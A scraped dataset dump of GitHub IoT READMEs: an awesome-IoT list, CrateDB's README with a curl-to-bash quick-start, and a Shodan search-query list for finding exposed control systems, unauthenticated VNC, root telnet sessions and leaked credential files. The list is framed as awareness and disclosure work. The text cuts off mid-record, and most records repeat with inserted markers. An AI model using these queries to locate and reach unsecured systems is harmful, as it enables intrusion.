coap.\nlobaro-coap \u2605 74 \u29d7 4 - complete coap implementation in c.\nmbed coap \u2605 23 \u29d7 11 - makes it easy to integrate a java se enabled device with coap based services like mbed cloud.\nmicrocoap \u2605 259 \u29d7 10 - a small coap implementation for microcontrollers.\nmqtt client framework \u2605 312 \u29d7 1 - ios, osx, tvos native objectivec mqtt client framework.\nnode coap \u2605 176 \u29d7 11 - node-coap is a client and server library for coap modeled after the http module.\npython coap \u2605 36 \u29d7 5 - a coap python library.\nswiftcoap \u2605 22 \u29d7 12 - swift server/client implementation of coap.\ntxthings \u2605 48 \u29d7 3 - coap library for twisted framework.\nspark\nspark-protocol \u2605 81 \u29d7 14 - node.js module for hosting direct encrypted coap socket connections.\nspark-server \u2605 371 \u29d7 13 - an api compatible open source server for interacting with devices speaking the spark-protocol\nwemo\narduino-esp8266-alexa-multiple-wemo-switch \u2605 213 \u29d7 0 - #arduino esp8266 alexa multiple belkin wemo switch emulator.\narduino-esp8266-alexa-wemo-switch \u2605 213 \u29d7 5 - amazon alexa + wemos switch made with arduino d1 mini.\nfauxmo \u2605 430 \u29d7 0 - emulated belkin wemo devices that work with the amazon echo.\nhomebridge-platform-wemo \u2605 106 \u29d7 24 - belkin wemo platform plugin for the awesome homebridge project.\nouimeaux \u2605 319 \u29d7 0 - open source control for belkin wemo devices.\nwemo.js \u2605 19 \u29d7 288 - this library aims to provide a simple interface to a belkin wemo power sockets.\nwemore \u2605 26 \u29d7 10 - a more awesome library for belkin wemo interactions.\nsmcp\nsmcp \u2605 55 \u29d7 0 - is an experimental coap-based machine-to-machine (m2m) protocol that is in the early stages of development.\nlora\nlora gateway bridge \u2605 78 \u29d7 0 - is a service which abstracts the packet_forwarder udp protocol running on most lora gateways into json over mqtt.\nlora server \u2605 237 \u29d7 0 - lora server is an open-source lorawan network-server.\nlorapi \u2605 28 \u29d7 31 - raspberry pi lora gateway/node for rfm92/95/96/98/69hcw modules.\nlowcostloragw \u2605 161 \u29d7 4 - low-cost lora iot & gateway with sx1272/76, raspberry and arduino.\nosgp\nosgp platform \u2605 35 \u29d7 7 - is an open, generic, scalable and independent 'internet of things' platform, which enables various connected smart objects in the public space to be easily controlled and monitored.\nopenthread\nopenthread \u2605 1139 \u29d7 2 - openthread is an open-source implementation of the thread networking protocol.\nopenthread border router \u2605 64 \u29d7 0 - an open source border router, built to work with openthread.\nothers\nanjay \u2605 16 \u29d7 23 - is a c library that aims to be the reference implementation of the oma lightweight machine-to-machine (lwm2m) device management protocol.\nlibimobiledevice \u2605 2294 \u29d7 0 - a library to communicate with services of apple ios devices using native protocols.\nmeq \u2605 920 \u29d7 1 - is a real-time communication service for connecting online devices.\noss-7 \u2605 44 \u29d7 37 - is an open source implementation of the dash7 alliance protocol for ultra low power wireless sensor communication.\nfork\naws iot button \u2605 5 \u29d7 4 - emulate the aws iot button on a raspberry pi with a simple push button using this c++ sample.\nhardware com\nbluetooth\nbluetoothlinux is a pure swift linux bluetooth stack.\nbluetoothserial \u2605 863 \u29d7 0 - cordova (phonegap) plugin for serial communication over bluetooth\nreact native bluetooth serial \u2605 299 \u29d7 2 - react native version of bluetoothserial plugin. for both android and ios\nnfc\nadafruit_nfcshield_i2c \u2605 110 \u29d7 13 - i2c driver for adafruit's pn532-based nfc shield\nchrome app nfc library \u2605 117 \u29d7 4 - with this simple library, you can build a chrome app that communicates over usb with nfc readers.\nliblogicalaccess \u2605 53 \u29d7 17 - c++ rfid library for windows/linux/mac. for pc/sc, nfc, iso compliant and proprietary hardware.\nlibnfc \u2605 119 \u29d7 4 - platform independent near field communication library.\nnfc tools for java \u2605 183 \u29d7 26 - nfctools is a collection of libraries and tools for nfc in java.\nnode nfc \u2605 41 \u29d7 38 - a first try at binding libnfc to node.\nrfidiot \u2605 314 \u29d7 6 - python rfid / nfc library & tools.\nserial\nrxtx \u2605 67 \u29d7 4 - a java cross platform wrapper library for the serial port\nothers\nbalena \u2605 329 \u29d7 3 - is a new container engine purpose-built for embedded and iot use cases and compatible with docker containers.\ndrake \u2605 500 \u29d7 0 - is a toolbox maintained by the robot locomotion group at the mit computer science and artificial intelligence lab (csail).\nibm messaging - community around ibm messaging products.\niotweb \u2605 4 \u29d7 9 - a embedded http and websocket server for uwp/.net 4.5.\nmender: deployment service \u2605 8 \u29d7 14 - microservice for managing software deployments for iiot devices within mender ecosystem.\nmeshblu \u2605 738 \u29d7 0 - machine-to-machine instant messaging platform for the internet of things.\npython enocean \u2605 13 \u29d7 45 - a python library for reading and controlling enocean devices.\nreact native esp8266 smartconfig \u2605 75 \u29d7 5 - a react-native module for esp8266 esptouch smart config.\nservo \u2605 7821 \u29d7 0 - is a prototype web browser engine written in the rust language.\nshellhub \u2605 702 \u29d7 70 - centralized ssh for the the edge and cloud computing.\nthe things network \u2605 67 \u29d7 4 - the things network is a global open crowdsourced internet of things data network.\nthe things network arduino library \u2605 82 \u29d7 9 - is an arduino library for arduino devices like the things uno and node to communicate via the things network.\nwamp protocol \u2605 228 \u29d7 1 - the web application messaging protocol the web application messaging protocol.\nsoftware\ncopper \u2605 46 \u29d7 14 - a firefox add-on to browse the internet of things\nprocessing \u2605 2644 \u29d7 0 - processing is a flexible software sketchbook and a language for learning how to code within the context of the visual arts.\ntools\npaho - the paho project provides open-source client implementations of mqtt and mqtt-sn messaging protocols aimed at new, existing, and emerging applications for machine\u2011to\u2011machine (m-2-m) and internet of things (iot).\nsmart.js \u2605 487 \u29d7 0 - embedded javascript engine for c/c++ with networking, file, database and device interfaces\nvoice\nchelexa \u2605 2 \u29d7 25 - natural voice recognition iot cloud chess solution via the amazon echo platform.\nmycroft - mycroft is the world\u2019s first open source voice assistant.\nresources-websites-projects\ncourse\nadvanced penetration testing - free\nan introduction to programming the internet of things (iot) specialization - landing page of 6 courses (introduction to the internet of things and embedded systems / the arduino platform and c programming / interfacing with the arduino / the raspberry pi platform and python programming for the raspberry pi / interfacing with the raspberry pi / programming for the internet of things capstone).\narchitecting smart iot devices - free\nbuild an intelligent system: from embedded to cloud (not free) - none\ncryptography - free\ncyber security graduate certificate - courses: operating systems and systems programming, introduction to computer networking, computer and network security, bitcoin and crypto currencies, introduction to cryptography, technology and national security (paid).\nintroduction to architecting smart iot devices - free\nlow-level software security: attacks and countermeassures - none\npenetration testing and ethical hacking - free\nsecure coding - free\nserverless reference architecture: iot backend \u2605 134 \u29d7 3 - demonstrates how to use aws lambda in conjunction with amazon kinesis, amazon dynamodb, amazon simple storage service (amazon s3), and amazon cloudwatch to build a serverless system for ingesting and processing sensor data.\nsocial engineering and manipulation - free\nsoftware architecture for the internet of things - free\nstanford advanced computer security certificate - required courses: using cryptography correctly, writing secure code, exploiting and protecting web applications; elective courses: software security foundations, mobile security, network security, emerging threats & defenses (paid).\nweb application penetration testing - free\nweb connectivity and security in embedded systems - free\nwebsite\neclipse iot - eclipse foundation iot top level project and working group.\nhackaday - discover. get inspired. repeat. hack things for the better.\nibm iot - ibm developerworks for iot\ninfoq iot weekly - weekly iot news, open source project, hardware\ninstructables - tech - explore the biggest how to and diy community where people make and share inspiring, entertaining, and useful projects, recipes, and hacks.\nmakezine - diy projects and ideas for makers.\nblog\narduino create - none\nhttp://edi.wang/ - asp.net, windows 10 iot\nibm developerworks iot - none\nibm iot blog - none\nindustrial iot blog - \"industrial iot/industrie 4.0 viewpoints\".\nintel iot blog - none\nmicrosoft iot blog - none\n\u552f\u7b11\u5fd7\u5728-serversuperio - none\nbosch connectedworld blog - iot articles from the world of bosch.\niot for all - high-quality iot content, resources, and news.\ngroup\nguokr diy - a chinese diy group.\ngithub org.\nintel iot-devkit libraries - official github repo for intel iot developer kit libraries & samples\nmicrosoft iot - microsoft iot team\nthe hybrid group - the create of cylon.js\nfree book\ndesign iot \u2605 594 \u29d7 0 - a ebook to tech your create iot system step by step.\niot-firstep \u2605 24 \u29d7 9 - a ebook to tech your create iot system.\nipv6-wsn-book - an easy guide to wireless sensor networks (wsn), ipv6 and the internet of things (iot).\nusing the web to build the iot - a collection of six hand-picked chapters that introduce the key technologies and concepts for building the application layer of the iot.\nrelated resources projects\nawesome-embedded-systems \u2605 0 \u29d7 29 - the website awesome-embedded-systems.org lists resources about embedded system, software and hardware development.\nawesome-mqtt \u2605 668 \u29d7 0 - curated list of mqtt related stuff.\ntutorial\nmicro-services-tutorial-iot \u2605 20 \u29d7 13 - an instructor led microservices workshop.\nunpacking the internet of things - shows use cases to help to identify possible potential for enterprise specific products.\narduino, raspberrypi and mqtt - builds an end to end iot application that ties together several aspects of the mqtt protocol.\nedge\nareg sdk \u2605 15 \u29d7 0 - areg sdk is a developer-friendly, an interface-centric real-time asynchronous communication engine to enable distributed- and mist-computing, where connected things interact and provide services, as if they act like thin distributed servers.\neden \u2605 25 \u29d7 0 - cli for edge virtualization engine (eve)\nproject flogo \u2605 207 \u29d7 0 - is an open source framework for iot edge apps & integration.\nai\nell \u2605 1859 \u29d7 0 - allows you to build and deploy machine-learned pipelines onto embedded platforms, like raspberry pis, arduinos, micro:bits, and other microcontrollers.\nlibdeep - a deep learning library for c/c++.\nmachinery \u2605 174 \u29d7 0 - is a low-budget video surveillance solution, that uses computer vision algorithms to detect changes, and that can trigger other devices.\ntensorflow for raspberry pi \u2605 317 \u29d7 0 - step-by-step instructions for installing tensorflow from source using bazel (which is also compiled from-scratch), as well as pre-built tensorflow binaries.\nanalytics\nbistro \u2605 321 \u29d7 0 - light-weight batch and stream analytics engine which radically changes the way data is processed. bistro relies on a novel column-oriented data model and is intended for iot applications and data processing at the edge.\nnetdata \u2605 18973 \u29d7 0 - is a system for distributed real-time performance and health monitoring.\npiwik \u2605 5374 \u29d7 0 - piwik is the leading free/libre open analytics platform.\nsamsara \u2605 64 \u29d7 1 - is a real-time analytics platform.\ndigital twins\neclipse ditto is the open-source project of eclipse iot that provides a ready-to-use functionality to manage the state of digital twins.\nothers\nconnectthedots \u2605 307 \u29d7 0 - connect tiny devices to microsoft azure services to build iot solutions\ndjango-th \u2605 275 \u29d7 0 - take the control of your data with this opensource clone of ifttt, a bridge between your internet services.\nsouliss \u2605 137 \u29d7 8 - arduino based distributed networking framework for smart homes and iot.\ncontributing\nyour contributions are always welcome! please submit a pull request or create an issue to add a new framework, library or software to the list. do not submit a project that hasn\u2019t been updated in the past 6 months or is not awesome.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000039, "year": null}, {"Unnamed: 0": 44, "autor": 44, "date": null, "content": "About\nCrateDB is a distributed SQL database that makes it simple to store and analyze massive amounts of data in real-time.\nCrateDB offers the benefits of an SQL database and the scalability and flexibility typically associated with NoSQL databases. Modest CrateDB clusters can ingest tens of thousands of records per second without breaking a sweat. You can run ad-hoc queries using standard SQL. CrateDB's blazing-fast distributed query execution engine parallelizes query workloads across the whole cluster.\nCrateDB is well suited to containerization, can be scaled horizontally using ephemeral virtual machines (e.g., Kubernetes, AWS, and Azure) with no shared state. You can deploy and run CrateDB on any sort of network \u2014 from personal computers to multi-region hybrid clouds and the edge.\nFeatures\nUse standard SQL via the PostgreSQL wire protocol or an HTTP API.\nDynamic table schemas and queryable objects provide document-oriented features in addition to the relational features of SQL.\nSupport for time-series data, realtime full-text search, geospatial data types and search capabilities.\nHorizontally scalable, highly available and fault tolerant clusters that run very well in virtualized and containerised environments.\nExtremely fast distributed query execution.\nAuto-partitioning, auto-sharding, and auto-replication.\nSelf-healing and auto-rebalancing.\nScreenshots\nCrateDB provides an Admin UI:\nTry CrateDB\nThe fastest way to try CrateDB out is by running:\nsh$ bash -c \"$(curl -L try.crate.io)\"\nOr spin up the official Docker image:\nsh$ docker run --publish 4200:4200 --publish 5432:5432 crate -Cdiscovery.type=single-node\nVisit the installation documentation to see all the available download and install options.\nOnce you're up and running, head over to the introductory docs. To interact with CrateDB, you can use the Admin UI web console or the CrateDB shell CLI tool. Alternatively, review the list of recommended clients and tools that work with CrateDB.\nFor container-specific documentation, check out the CrateDB on Docker how-to guide or the CrateDB on Kubernetes how-to guide.\nContributing\nThis project is primarily maintained by Crate.io, but we welcome community contributions!\nSee the developer docs and the contribution docs for more information.\nHelp\nLooking for more help?\nTry one of our beginner tutorials, how-to guides, or consult the reference manual.\nCheck out our support channels.\nCrate.io also offers CrateDB Cloud, a fully-managed CrateDB Database as a Service (DBaaS). The CrateDB Cloud Tutorials will get you started.", "link": "https://github.com/crate/crate", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "about\ncratedb is a distributed sql database that makes it simple to store and analyze massive amounts of data in real-time.\ncratedb offers the benefits of an sql database and the scalability and flexibility typically associated with nosql databases. modest cratedb clusters can ingest tens of thousands of records per second without breaking a sweat. you can run ad-hoc queries using standard sql. cratedb's blazing-fast distributed query execution engine parallelizes query workloads across the whole cluster.\ncratedb is well suited to containerization, can be scaled horizontally using ephemeral virtual machines (e.g., kubernetes, aws, and azure) with no shared state. you can deploy and run cratedb on any sort of network \u2014 from personal computers to multi-region hybrid clouds and the edge.\nfeatures\nuse standard sql via the postgresql wire protocol or an http api.\ndynamic table schemas and queryable objects provide document-oriented features in addition to the relational features of sql.\nsupport for time-series data, realtime full-text search, geospatial data types and search capabilities.\nhorizontally scalable, highly available and fault tolerant clusters that run very well in virtualized and containerised environments.\nextremely fast distributed query execution.\nauto-partitioning, auto-sharding, and auto-replication.\nself-healing and auto-rebalancing.\nscreenshots\ncratedb provides an admin ui:\ntry cratedb\nthe fastest way to try cratedb out is by running:\nsh$ bash -c \"$(curl -l try.crate.io)\"\nor spin up the official docker image:\nsh$ docker run --publish 4200:4200 --publish 5432:5432 crate -cdiscovery.type=single-node\nvisit the installation documentation to see all the available download and install options.\nonce you're up and running, head over to the introductory docs. to interact with cratedb, you can use the admin ui web console or the cratedb shell cli -----> tool !!! . alternatively, review the list of recommended clients and tools that work with cratedb.\nfor container-specific documentation, check out the cratedb on docker how-to guide or the cratedb on kubernetes how-to guide.\ncontributing\nthis project is primarily maintained by crate.io, but we welcome community contributions!\nsee the developer docs and the contribution docs for more information.\nhelp\nlooking for more help?\ntry one of our beginner tutorials, how-to guides, or consult the reference manual.\ncheck out our support channels.\ncrate.io also offers cratedb cloud, a fully-managed cratedb database as a service (dbaas). the cratedb cloud tutorials will get you started.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000044, "year": null}, {"Unnamed: 0": 46, "autor": 46, "date": null, "content": "Awesome Shodan Search Queries\nOver time, I've collected an assortment of interesting, funny, and depressing search queries to plug into Shodan, the (literal) internet search engine. Some return facepalm-inducing results, while others return serious and/or ancient vulnerabilities in the wild.\nMost search filters require a Shodan account.\nYou can assume these queries only return unsecured/open instances when possible. For your own legal benefit, do not attempt to login (even with default passwords) if they aren't! Narrow down results by adding filters like country:US or org:\"Harvard University\" or hostname:\"nasa.gov\" to the end.\nThe world and its devices are quickly becoming more connected through the shiny new Internet of Things Sh*t \u2014 and exponentially more dangerous as a result. To that end, I hope this list spreads awareness (and, quite frankly, pant-wetting fear) rather than harm.\nAnd as always, discover and disclose responsibly! \ud83e\udd13\nTable of Contents\nIndustrial Control Systems\nRemote Desktop\nNetwork Infrastructure\nNetwork Attached Storage (NAS)\nWebcams\nPrinters & Copiers\nHome Devices\nRandom Stuff\nIndustrial Control Systems\nSamsung Electronic Billboards \ud83d\udd0e \u2192\n\"Server: Prismview Player\"\nGas Station Pump Controllers \ud83d\udd0e \u2192\n\"in-tank inventory\" port:10001\nAutomatic License Plate Readers \ud83d\udd0e \u2192\nP372 \"ANPR enabled\"\nTraffic Light Controllers / Red Light Cameras \ud83d\udd0e \u2192\nmikrotik streetlight\nVoting Machines in the United States \ud83d\udd0e \u2192\n\"voter system serial\" country:US\nTelcos Running Cisco Lawful Intercept Wiretaps \ud83d\udd0e \u2192\n\"Cisco IOS\" \"ADVIPSERVICESK9_LI-M\"\nWiretapping mechanism outlined by Cisco in RFC 3924:\nLawful intercept is the lawfully authorized interception and monitoring of communications of an intercept subject. The term \"intercept subject\" [...] refers to the subscriber of a telecommunications service whose communications and/or intercept related information (IRI) has been lawfully authorized to be intercepted and delivered to some agency.\nPrison Pay Phones \ud83d\udd0e \u2192\n\"[2J[H Encartele Confidential\"\nTesla PowerPack Charging Status \ud83d\udd0e \u2192\nhttp.title:\"Tesla PowerPack System\" http.component:\"d3\" -ga3ca4f2\nElectric Vehicle Chargers \ud83d\udd0e \u2192\n\"Server: gSOAP/2.8\" \"Content-Length: 583\"\nMaritime Satellites \ud83d\udd0e \u2192\nShodan made a pretty sweet Ship Tracker that maps ship locations in real time, too!\n\"Cobham SATCOM\" OR (\"Sailor\" \"VSAT\")\nSubmarine Mission Control Dashboards \ud83d\udd0e \u2192\ntitle:\"Slocum Fleet Mission Control\"\nCAREL PlantVisor Refrigeration Units \ud83d\udd0e \u2192\n\"Server: CarelDataServer\" \"200 Document follows\"\nNordex Wind Turbine Farms \ud83d\udd0e \u2192\nhttp.title:\"Nordex Control\" \"Windows 2000 5.0 x86\" \"Jetty/3.1 (JSP 1.1; Servlet 2.2; java 1.6.0_14)\"\nC4 Max Commercial Vehicle GPS Trackers \ud83d\udd0e \u2192\n\"[1m[35mWelcome on console\"\nDICOM Medical X-Ray Machines \ud83d\udd0e \u2192\nSecured by default, thankfully, but these 1,700+ machines still have no business being on the internet.\n\"DICOM Server Response\" port:104\nGaugeTech Electricity Meters \ud83d\udd0e \u2192\n\"Server: EIG Embedded Web Server\" \"200 Document follows\"\nSiemens Industrial Automation \ud83d\udd0e \u2192\n\"Siemens, SIMATIC\" port:161\nSiemens HVAC Controllers \ud83d\udd0e \u2192\n\"Server: Microsoft-WinCE\" \"Content-Length: 12581\"\nDoor / Lock Access Controllers \ud83d\udd0e \u2192\n\"HID VertX\" port:4070\nRailroad Management \ud83d\udd0e \u2192\n\"log off\" \"select the appropriate\"\nRemote Desktop\nUnprotected VNC \ud83d\udd0e \u2192\n\"authentication disabled\" \"RFB 003.008\"\nShodan Images is a great supplementary tool to browse screenshots, by the way! \ud83d\udd0e \u2192\nThe first result right now. \ud83d\ude1e\nWindows RDP \ud83d\udd0e \u2192\n99.99% are secured by a secondary Windows login screen.\n\"\\x03\\x00\\x00\\x0b\\x06\\xd0\\x00\\x00\\x124\\x00\"\nNetwork Infrastructure\nWeave Scope Dashboards \ud83d\udd0e \u2192\nCommand-line access inside Kubernetes pods and Docker containers, and real-time visualization/monitoring of the entire infrastructure.\ntitle:\"Weave Scope\" http.favicon.hash:567176827\nMongoDB \ud83d\udd0e \u2192\nOlder versions were insecure by default. Very scary.\n\"MongoDB Server Information\" port:27017 -authentication\nMongo Express Web GUI \ud83d\udd0e \u2192\nLike the infamous phpMyAdmin but for MongoDB.\n\"Set-Cookie: mongo-express=\" \"200 OK\"\nJenkins CI \ud83d\udd0e \u2192\n\"X-Jenkins\" \"Set-Cookie: JSESSIONID\" http.title:\"Dashboard\"\nDocker APIs \ud83d\udd0e \u2192\n\"Docker Containers:\" port:2375\nDocker Private Registries \ud83d\udd0e \u2192\n\"Docker-Distribution-Api-Version: registry\" \"200 OK\" -gitlab\nPi-hole Open DNS Servers \ud83d\udd0e \u2192\n\"dnsmasq-pi-hole\" \"Recursion: enabled\"\nAlready Logged-In as root via Telnet \ud83d\udd0e \u2192\n\"root@\" port:23 -login -password -name -Session\nAndroid Root Bridges \ud83d\udd0e \u2192\nA tangential result of Google's sloppy fractured update approach. \ud83d\ude44 More information here.\n\"Android Debug Bridge\" \"Device\" port:5555\nLantronix Serial-to-Ethernet Adapter Leaking Telnet Passwords \ud83d\udd0e \u2192\nLantronix password port:30718 -secured\nCitrix Virtual Apps \ud83d\udd0e \u2192\n\"Citrix Applications:\" port:1604\nCisco Smart Install \ud83d\udd0e \u2192\nVulnerable (kind of \"by design,\" but especially when exposed).\n\"smart install client active\"\nPBX IP Phone Gateways \ud83d\udd0e \u2192\nPBX \"gateway console\" -password port:23\nPolycom Video Conferencing \ud83d\udd0e \u2192\nhttp.title:\"- Polycom\" \"Server: lighttpd\"\nTelnet Configuration: \ud83d\udd0e \u2192\n\"Polycom Command Shell\" -failed port:23\nBomgar Help Desk Portal \ud83d\udd0e \u2192\n\"Server: Bomgar\" \"200 OK\"\nIntel Active Management CVE-2017-5689 \ud83d\udd0e \u2192\n\"Intel(R) Active Management Technology\" port:623,664,16992,16993,16994,16995\nHP iLO 4 CVE-2017-12542 \ud83d\udd0e \u2192\nHP-ILO-4 !\"HP-ILO-4/2.53\" !\"HP-ILO-4/2.54\" !\"HP-ILO-4/2.55\" !\"HP-ILO-4/2.60\" !\"HP-ILO-4/2.61\" !\"HP-ILO-4/2.62\" !\"HP-iLO-4/2.70\" port:1900\nOutlook Web Access:\nExchange 2007 \ud83d\udd0e \u2192\n\"x-owa-version\" \"IE=EmulateIE7\" \"Server: Microsoft-IIS/7.0\"\nExchange 2010 \ud83d\udd0e \u2192\n\"x-owa-version\" \"IE=EmulateIE7\" http.favicon.hash:442749392\nExchange 2013 / 2016 \ud83d\udd0e \u2192\n\"X-AspNet-Version\" http.title:\"Outlook\" -\"x-owa-version\"\nLync / Skype for Business \ud83d\udd0e \u2192\n\"X-MS-Server-Fqdn\"\nNetwork Attached Storage (NAS)\nSMB (Samba) File Shares \ud83d\udd0e \u2192\nProduces ~500,000 results...narrow down by adding \"Documents\" or \"Videos\", etc.\n\"Authentication: disabled\" port:445\nSpecifically domain controllers: \ud83d\udd0e \u2192\n\"Authentication: disabled\" NETLOGON SYSVOL -unix port:445\nConcerning default network shares of QuickBooks files: \ud83d\udd0e \u2192\n\"Authentication: disabled\" \"Shared this folder to access QuickBooks files OverNetwork\" -unix port:445\nFTP Servers with Anonymous Login \ud83d\udd0e \u2192\n\"220\" \"230 Login successful.\" port:21\nIomega / LenovoEMC NAS Drives \ud83d\udd0e \u2192\n\"Set-Cookie: iomega=\" -\"manage/login.html\" -http.title:\"Log In\"\nBuffalo TeraStation NAS Drives \ud83d\udd0e \u2192\nRedirecting sencha port:9000\nLogitech Media Servers \ud83d\udd0e \u2192\n\"Server: Logitech Media Server\" \"200 OK\"\nPlex Media Servers \ud83d\udd0e \u2192\n\"X-Plex-Protocol\" \"200 OK\" port:32400\nTautulli / PlexPy Dashboards \ud83d\udd0e \u2192\n\"CherryPy/5.1.0\" \"/home\"\nWebcams\nExample images not necessary. \ud83e\udd26\nYawcams \ud83d\udd0e \u2192\n\"Server: yawcam\" \"Mime-Type: text/html\"\nwebcamXP/webcam7 \ud83d\udd0e \u2192\n(\"webcam 7\" OR \"webcamXP\") http.component:\"mootools\" -401\nAndroid IP Webcam Server \ud83d\udd0e \u2192\n\"Server: IP Webcam Server\" \"200 OK\"\nSecurity DVRs \ud83d\udd0e \u2192\nhtml:\"DVR_H264 ActiveX\"\nPrinters & Copiers:\nHP Printers \ud83d\udd0e \u2192\n\"Serial Number:\" \"Built:\" \"Server: HP HTTP\"\nXerox Copiers/Printers \ud83d\udd0e \u2192\nssl:\"Xerox Generic Root\"\nEpson Printers \ud83d\udd0e \u2192\n\"SERVER: EPSON_Linux UPnP\" \"200 OK\"\n\"Server: EPSON-HTTP\" \"200 OK\"\nCanon Printers \ud83d\udd0e \u2192\n\"Server: KS_HTTP\" \"200 OK\"\n\"Server: CANON HTTP Server\"\nHome Devices\nYamaha Stereos \ud83d\udd0e \u2192\n\"Server: AV_Receiver\" \"HTTP/1.1 406\"\nApple AirPlay Receivers \ud83d\udd0e \u2192\nApple TVs, HomePods, etc.\n\"\\x08_airplay\" port:5353\nChromecasts / Smart TVs \ud83d\udd0e \u2192\n\"Chromecast:\" port:8008\nCrestron Smart Home Controllers \ud83d\udd0e \u2192\n\"Model: PYNG-HUB\"\nRandom Stuff\nOctoPrint 3D Printer Controllers \ud83d\udd0e \u2192\ntitle:\"OctoPrint\" -title:\"Login\" http.favicon.hash:1307375944\nEtherium Miners \ud83d\udd0e \u2192\n\"ETH - Total speed\"\nApache Directory Listings \ud83d\udd0e \u2192\nSubstitute .pem with any extension or a filename like phpinfo.php.\nhttp.title:\"Index of /\" http.html:\".pem\"\nMisconfigured WordPress \ud83d\udd0e \u2192\nExposed wp-config.php files containing database credentials.\nhttp.html:\"* The wp-config.php creation script uses this file\"\nToo Many Minecraft Servers \ud83d\udd0e \u2192\n\"Minecraft Server\" \"protocol 340\" port:25565\nLiterally Everything in North Korea \ud83c\uddf0\ud83c\uddf5 \ud83d\udd0e \u2192\nnet:175.45.176.0/22,210.52.109.0/24,77.94.35.0/24\nTCP Quote of the Day \ud83d\udd0e \u2192\nPort 17 (RFC 865) has a bizarre history...\nport:17 product:\"Windows qotd\"\nFind a Job Doing This! \ud83d\udc69\u200d\ud83d\udcbc \ud83d\udd0e \u2192\n\"X-Recruiting:\"\nIf you've found any other juicy Shodan gems, whether it's a search query or a specific example, definitely drop a comment on the blog or open an issue/PR here on GitHub.\nBon voyage, fellow penetrators! \ud83d\ude09\nLicense\nTo the extent possible under law, Jake Jarvis has waived all copyright and related or neighboring rights to this work.\nMirrored from a blog post at https://jarv.is/notes/shodan-search-queries/.", "link": "https://github.com/jakejarvis/awesome-shodan-queries", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome shodan search queries\nover time, i've collected an assortment of interesting, funny, and depressing search queries to plug into shodan, the (literal) internet search engine. some return facepalm-inducing results, while others return serious and/or ancient vulnerabilities in the wild.\nmost search filters require a shodan account.\nyou can assume these queries only return unsecured/open instances when possible. for your own legal benefit, do not attempt to login (even with default passwords) if they aren't! narrow down results by adding filters like country:us or org:\"harvard university\" or hostname:\"nasa.gov\" to the end.\nthe world and its devices are quickly becoming more connected through the shiny new internet of things sh*t \u2014 and exponentially more dangerous as a result. to that end, i hope this list spreads awareness (and, quite frankly, pant-wetting fear) rather than harm.\nand as always, discover and disclose responsibly! \ud83e\udd13\ntable of contents\nindustrial control systems\nremote desktop\nnetwork infrastructure\nnetwork attached storage (nas)\nwebcams\nprinters & copiers\nhome devices\nrandom stuff\nindustrial control systems\nsamsung electronic billboards \ud83d\udd0e \u2192\n\"server: prismview player\"\ngas station pump controllers \ud83d\udd0e \u2192\n\"in-tank inventory\" port:10001\nautomatic license plate readers \ud83d\udd0e \u2192\np372 \"anpr enabled\"\ntraffic light controllers / red light cameras \ud83d\udd0e \u2192\nmikrotik streetlight\nvoting machines in the united states \ud83d\udd0e \u2192\n\"voter system serial\" country:us\ntelcos running cisco lawful intercept wiretaps \ud83d\udd0e \u2192\n\"cisco ios\" \"advipservicesk9_li-m\"\nwiretapping mechanism outlined by cisco in rfc 3924:\nlawful intercept is the lawfully authorized interception and monitoring of communications of an intercept subject. the term \"intercept subject\" [...] refers to the subscriber of a telecommunications service whose communications and/or intercept related information (iri) has been lawfully authorized to be intercepted and delivered to some agency.\nprison pay phones \ud83d\udd0e \u2192\n\"[2j[h encartele confidential\"\ntesla powerpack charging status \ud83d\udd0e \u2192\nhttp.title:\"tesla powerpack system\" http.component:\"d3\" -ga3ca4f2\nelectric vehicle chargers \ud83d\udd0e \u2192\n\"server: gsoap/2.8\" \"content-length: 583\"\nmaritime satellites \ud83d\udd0e \u2192\nshodan made a pretty sweet ship tracker that maps ship locations in real time, too!\n\"cobham satcom\" or (\"sailor\" \"vsat\")\nsubmarine mission control dashboards \ud83d\udd0e \u2192\ntitle:\"slocum fleet mission control\"\ncarel plantvisor refrigeration units \ud83d\udd0e \u2192\n\"server: careldataserver\" \"200 document follows\"\nnordex wind turbine farms \ud83d\udd0e \u2192\nhttp.title:\"nordex control\" \"windows 2000 5.0 x86\" \"jetty/3.1 (jsp 1.1; servlet 2.2; java 1.6.0_14)\"\nc4 max commercial vehicle gps trackers \ud83d\udd0e \u2192\n\"[1m[35mwelcome on console\"\ndicom medical x-ray machines \ud83d\udd0e \u2192\nsecured by default, thankfully, but these 1,700+ machines still have no business being on the internet.\n\"dicom server response\" port:104\ngaugetech electricity meters \ud83d\udd0e \u2192\n\"server: eig embedded web server\" \"200 document follows\"\nsiemens industrial automation \ud83d\udd0e \u2192\n\"siemens, simatic\" port:161\nsiemens hvac controllers \ud83d\udd0e \u2192\n\"server: microsoft-wince\" \"content-length: 12581\"\ndoor / lock access controllers \ud83d\udd0e \u2192\n\"hid vertx\" port:4070\nrailroad management \ud83d\udd0e \u2192\n\"log off\" \"select the appropriate\"\nremote desktop\nunprotected vnc \ud83d\udd0e \u2192\n\"authentication disabled\" \"rfb 003.008\"\nshodan images is a great supplementary -----> tool !!!  to browse screenshots, by the way! \ud83d\udd0e \u2192\nthe first result right now. \ud83d\ude1e\nwindows rdp \ud83d\udd0e \u2192\n99.99% are secured by a secondary windows login screen.\n\"\\x03\\x00\\x00\\x0b\\x06\\xd0\\x00\\x00\\x124\\x00\"\nnetwork infrastructure\nweave scope dashboards \ud83d\udd0e \u2192\ncommand-line access inside kubernetes pods and docker containers, and real-time visualization/monitoring of the entire infrastructure.\ntitle:\"weave scope\" http.favicon.hash:567176827\nmongodb \ud83d\udd0e \u2192\nolder versions were insecure by default. very scary.\n\"mongodb server information\" port:27017 -authentication\nmongo express web gui \ud83d\udd0e \u2192\nlike the infamous phpmyadmin but for mongodb.\n\"set-cookie: mongo-express=\" \"200 ok\"\njenkins ci \ud83d\udd0e \u2192\n\"x-jenkins\" \"set-cookie: jsessionid\" http.title:\"dashboard\"\ndocker apis \ud83d\udd0e \u2192\n\"docker containers:\" port:2375\ndocker private registries \ud83d\udd0e \u2192\n\"docker-distribution-api-version: registry\" \"200 ok\" -gitlab\npi-hole open dns servers \ud83d\udd0e \u2192\n\"dnsmasq-pi-hole\" \"recursion: enabled\"\nalready logged-in as root via 